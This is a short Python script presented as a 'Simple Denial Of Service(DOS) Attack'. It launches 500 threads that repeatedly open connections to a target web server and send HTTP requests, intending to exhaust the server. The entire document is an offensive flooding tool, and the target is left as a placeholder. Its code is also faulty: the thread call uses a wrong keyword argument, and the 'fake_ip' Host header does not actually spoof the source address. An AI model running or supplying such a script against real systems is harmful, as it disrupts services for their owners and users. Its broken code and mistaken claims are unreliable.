import socket,threading
target_ip = 'UR Target'
fake_ip = '190.23.42.1'
target_port = 80
attacknumber= 0
print("Simple Denial Of Service(DOS) Attack")
def attack_target():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip,target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip,target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip,target_port))
        global attacknumber
        attacknumber += 1
        print("Current attack number :  ",attacknumber)
        s.close()

for i in range(500):
    thread = threading.Thread(target_ip=attack_target)
    thread.start()
